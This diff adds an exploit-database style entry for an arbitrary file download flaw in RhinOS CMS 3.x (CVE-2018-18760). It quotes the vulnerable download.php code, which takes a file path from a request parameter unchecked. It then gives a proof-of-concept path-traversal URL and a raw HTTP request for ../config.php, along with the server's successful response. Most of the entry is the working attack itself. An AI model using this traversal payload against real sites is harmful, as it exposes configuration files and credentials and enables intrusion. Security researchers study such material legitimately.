@@ -1,0 +1,62 @@
+# Exploit Title: RhinOS CMS 3.x - Arbitrary File Download
+# Dork: N/A
+# Date: 2018-10-29
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.saltos.org/
+# Software Link: https://netix.dl.sourceforge.net/project/rhinos/archived/r1190/RhinOS-en-3.0-1190.win32.exe
+# Version: 3.1 r0 / 3.x
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-18760
+
+# Users...
+# C:/rhinos/demo/admin/php/download.php
+#....
+#26 $head=0;$main=0;$tail=0;
+#27 include("inicio.php");
+#28 if(!check_user()) die();
+#29 $name=getParam("name");
+#30 $file="files/".getParam("file");
+#31 $size=getParam("size");
+#32 $type=getParam("type");
+#33 if(!file_exists($file)) die();
+#34 header("Pragma: public");
+#35 header("Expires: 0");
+#36 header("Cache-Control: must-revalidate, post-check=0, pre-check=0");
+#37 header("Content-Type: $type");
+#38 header("Content-Length: $size");
+#39 header("Content-Disposition: attachment; filename=\"$name\"");
+#40 header("Content-Transfer-Encoding: binary");
+#41 $fp=fopen($file,"rb");
+#42 while(!feof($fp)) echo fread($fp,8192);
+#43 fclose($fp);
+#44 disconnect();
+#....
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/admin/inicio.php?include=php/download.php&name=efe.php&file=../config.php
+# 
+GET /[PATH]/admin/inicio.php?include=php/download.php&name=efe.php&file=../config.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:50.0) Gecko/20100101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: remember=0; PHPSESSID=ek24koab445aab70seegi02lh3
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Mon, 29 Oct 2018 00:23:54 GMT
+Server: Apache/2.2.16 (Win32) PHP/5.3.3
+X-Powered-By: PHP/5.3.3
+Expires: 0
+Cache-Control: must-revalidate, post-check=0, pre-check=0
+Pragma: public
+Content-Length: 1771
+Content-Disposition: attachment; filename="efe.php"
+Content-Transfer-Encoding: binary
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type:
